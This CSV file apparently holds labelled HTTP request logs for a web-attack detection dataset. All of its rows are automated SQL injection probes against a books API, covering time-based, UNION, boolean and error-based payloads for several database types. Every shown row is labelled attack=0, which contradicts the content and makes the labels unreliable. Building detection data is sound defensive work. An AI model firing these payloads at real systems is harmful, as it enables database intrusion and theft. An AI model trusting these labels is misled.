ip,method,endpoint,status,endpoint_length,param_count,has_query,attack
175.45.188.252,GET,/api/v1/books?search=%29%3BSELECT%20PG_SLEEP%285%29--&page=1&size=9,200,67,2,1,0
175.45.188.252,GET,/api/v1/books?search=%3BSELECT%20PG_SLEEP%285%29--&page=1&size=9,200,64,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%3BSELECT%20PG_SLEEP%285%29--&page=1&size=9,200,70,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%3BSELECT%20PG_SLEEP%285%29--&page=1&size=9,200,67,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&page=1&size=9,200,76,2,1,0
175.45.188.252,GET,/api/v1/books?search=%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&page=1&size=9,200,73,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&page=1&size=9,200,79,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&page=1&size=9,200,76,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28117%29%7C%7CCHR%2899%29%7C%7CCHR%28119%29%7C%7CCHR%2866%29%2C5%29%20FROM%20DUAL--&page=1&size=9,200,165,2,1,0
175.45.188.252,GET,/api/v1/books?search=%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28117%29%7C%7CCHR%2899%29%7C%7CCHR%28119%29%7C%7CCHR%2866%29%2C5%29%20FROM%20DUAL--&page=1&size=9,200,162,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28117%29%7C%7CCHR%2899%29%7C%7CCHR%28119%29%7C%7CCHR%2866%29%2C5%29%20FROM%20DUAL--&page=1&size=9,200,168,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28117%29%7C%7CCHR%2899%29%7C%7CCHR%28119%29%7C%7CCHR%2866%29%2C5%29%20FROM%20DUAL--&page=1&size=9,200,165,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20AND%20%28SELECT%208344%20FROM%20%28SELECT%28SLEEP%285%29%29%29DkCW%29%20AND%20%283014%3D3014&page=1&size=9,200,133,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%20%28SELECT%208344%20FROM%20%28SELECT%28SLEEP%285%29%29%29DkCW%29&page=1&size=9,200,107,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20AND%20%28SELECT%208344%20FROM%20%28SELECT%28SLEEP%285%29%29%29DkCW%29%20AND%20%28%27pWqo%27%3D%27pWqo&page=1&size=9,200,145,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20AND%20%28SELECT%208344%20FROM%20%28SELECT%28SLEEP%285%29%29%29DkCW%29%20AND%20%27EVnH%27%3D%27EVnH&page=1&size=9,200,139,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%20%28SELECT%208344%20FROM%20%28SELECT%28SLEEP%285%29%29%29DkCW%29--%20eVTI&page=1&size=9,200,116,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20AND%202015%3D%28SELECT%202015%20FROM%20PG_SLEEP%285%29%29%20AND%20%282603%3D2603&page=1&size=9,200,121,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%202015%3D%28SELECT%202015%20FROM%20PG_SLEEP%285%29%29&page=1&size=9,200,95,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20AND%202015%3D%28SELECT%202015%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27MZGT%27%3D%27MZGT&page=1&size=9,200,133,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20AND%202015%3D%28SELECT%202015%20FROM%20PG_SLEEP%285%29%29%20AND%20%27NIgP%27%3D%27NIgP&page=1&size=9,200,127,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%202015%3D%28SELECT%202015%20FROM%20PG_SLEEP%285%29%29--%20fJgL&page=1&size=9,200,104,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%286292%3D6292&page=1&size=9,200,97,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20WAITFOR%20DELAY%20%270%3A0%3A5%27&page=1&size=9,200,71,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27fFIC%27%3D%27fFIC&page=1&size=9,200,109,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27asCW%27%3D%27asCW&page=1&size=9,200,103,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20seaP&page=1&size=9,200,80,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20AND%209889%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2871%29%7C%7CCHR%28119%29%7C%7CCHR%28114%29%2C5%29%20AND%20%285018%3D5018&page=1&size=9,200,176,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%209889%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2871%29%7C%7CCHR%28119%29%7C%7CCHR%28114%29%2C5%29&page=1&size=9,200,150,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20AND%209889%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2871%29%7C%7CCHR%28119%29%7C%7CCHR%28114%29%2C5%29%20AND%20%28%27MiPP%27%3D%27MiPP&page=1&size=9,200,188,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20AND%209889%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2871%29%7C%7CCHR%28119%29%7C%7CCHR%28114%29%2C5%29%20AND%20%27FCtv%27%3D%27FCtv&page=1&size=9,200,182,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%209889%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2871%29%7C%7CCHR%28119%29%7C%7CCHR%28114%29%2C5%29--%20qzEd&page=1&size=9,200,159,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20ORDER%20BY%201--%20hhus&page=1&size=9,200,64,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20UNION%20ALL%20SELECT%20NULL--%20Pkgd&page=1&size=9,200,77,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20HKAv&page=1&size=9,200,84,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20Ajit&page=1&size=9,200,91,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20qvHI&page=1&size=9,200,98,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20DnAQ&page=1&size=9,200,105,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20mPJg&page=1&size=9,200,112,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20VHPk&page=1&size=9,200,119,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20zcgY&page=1&size=9,200,126,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20YCFS&page=1&size=9,200,133,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20NqXW&page=1&size=9,200,140,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20ORDER%20BY%201--%20psKJ&page=1&size=9,200,61,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL--%20LrzR&page=1&size=9,200,74,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20CKlv&page=1&size=9,200,81,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20QkRg&page=1&size=9,200,88,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20HXAn&page=1&size=9,200,95,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20azoG&page=1&size=9,200,102,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20LiCn&page=1&size=9,200,109,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20bXhT&page=1&size=9,200,116,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20PQZT&page=1&size=9,200,123,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20Xrhg&page=1&size=9,200,130,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20hlKz&page=1&size=9,200,137,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20ORDER%20BY%201--%20tGYF&page=1&size=9,200,67,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20UNION%20ALL%20SELECT%20NULL--%20CyFD&page=1&size=9,200,80,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20bvfX&page=1&size=9,200,87,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20gxEB&page=1&size=9,200,94,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20UfIX&page=1&size=9,200,101,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20jbcw&page=1&size=9,200,108,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20THIY&page=1&size=9,200,115,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20VeGr&page=1&size=9,200,122,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20UwQV&page=1&size=9,200,129,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20DQKK&page=1&size=9,200,136,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20XDtm&page=1&size=9,200,143,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20ORDER%20BY%201--%20gKwL&page=1&size=9,200,64,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20UNION%20ALL%20SELECT%20NULL--%20AjFI&page=1&size=9,200,77,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20BgQA&page=1&size=9,200,84,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20mWHL&page=1&size=9,200,91,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20AxPb&page=1&size=9,200,98,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20oFRQ&page=1&size=9,200,105,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20mQTH&page=1&size=9,200,112,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20qZot&page=1&size=9,200,119,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20dXHN&page=1&size=9,200,126,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20DMkh&page=1&size=9,200,133,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20PBLT&page=1&size=9,200,140,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20ORDER%20BY%201--%20VBCc&page=1&size=9,200,61,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL--%20ytve&page=1&size=9,200,74,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20bAGY&page=1&size=9,200,81,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20yrnT&page=1&size=9,200,88,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20Yzxe&page=1&size=9,200,95,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20NVTZ&page=1&size=9,200,102,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20lfeJ&page=1&size=9,200,109,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20iJGP&page=1&size=9,200,116,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20wwPB&page=1&size=9,200,123,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20HxYd&page=1&size=9,200,130,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20aHjD&page=1&size=9,200,137,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=6588&size=9,200,38,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%22%28%28.%27..%28%28%28&size=9,200,59,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=8677-8676&size=9,200,43,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%27DHDKRI%3C%27%22%3EWdPalA&size=9,200,62,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%29%20AND%201789%3D6193%20AND%20%284428%3D4428&size=9,200,81,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%20AND%204741%3D3651&size=9,200,55,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%20AND%205714%3D2020--%20AXwH&size=9,200,64,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%27%29%20AND%204004%3D8533%20AND%20%28%27kfDT%27%3D%27kfDT&size=9,200,93,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%27%20AND%202781%3D1446%20AND%20%27hfxW%27%3D%27hfxW&size=9,200,87,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=%28SELECT%20%28CASE%20WHEN%20%285565%3D1607%29%20THEN%201%20ELSE%20%28SELECT%201607%20UNION%20SELECT%202938%29%20END%29%29&size=9,200,156,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%29%20AND%20EXTRACTVALUE%284557%2CCONCAT%280x5c%2C0x717a6b6271%2C%28SELECT%20%28ELT%284557%3D4557%2C1%29%29%29%2C0x716a627071%29%29%20AND%20%282208%3D2208&size=9,200,189,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%20AND%20EXTRACTVALUE%284557%2CCONCAT%280x5c%2C0x717a6b6271%2C%28SELECT%20%28ELT%284557%3D4557%2C1%29%29%29%2C0x716a627071%29%29&size=9,200,163,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%20AND%20EXTRACTVALUE%284557%2CCONCAT%280x5c%2C0x717a6b6271%2C%28SELECT%20%28ELT%284557%3D4557%2C1%29%29%29%2C0x716a627071%29%29--%20HHod&size=9,200,172,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%27%29%20AND%20EXTRACTVALUE%284557%2CCONCAT%280x5c%2C0x717a6b6271%2C%28SELECT%20%28ELT%284557%3D4557%2C1%29%29%29%2C0x716a627071%29%29%20AND%20%28%27lvDf%27%3D%27lvDf&size=9,200,201,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%27%20AND%20EXTRACTVALUE%284557%2CCONCAT%280x5c%2C0x717a6b6271%2C%28SELECT%20%28ELT%284557%3D4557%2C1%29%29%29%2C0x716a627071%29%29%20AND%20%27wvJZ%27%3D%27wvJZ&size=9,200,195,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%29%20AND%203033%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283033%3D3033%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%283349%3D3349&size=9,200,382,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%20AND%203033%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283033%3D3033%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&size=9,200,356,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%20AND%203033%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283033%3D3033%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20bnEG&size=9,200,365,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%27%29%20AND%203033%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283033%3D3033%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27jLlB%27%3D%27jLlB&size=9,200,394,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%27%20AND%203033%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283033%3D3033%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27utef%27%3D%27utef&size=9,200,388,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%29%20AND%209874%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%289874%3D9874%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%288031%3D8031&size=9,200,363,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%20AND%209874%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%289874%3D9874%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29&size=9,200,337,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%20AND%209874%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%289874%3D9874%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20Jqhw&size=9,200,346,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%27%29%20AND%209874%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%289874%3D9874%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%28%27KEHN%27%3D%27KEHN&size=9,200,375,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%27%20AND%209874%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%289874%3D9874%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%27jCny%27%3D%27jCny&size=9,200,369,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%29%20AND%204008%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284008%3D4008%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%286682%3D6682&size=9,200,453,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%20AND%204008%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284008%3D4008%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&size=9,200,427,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1%20AND%204008%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284008%3D4008%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20XHra&size=9,200,436,2,1,0
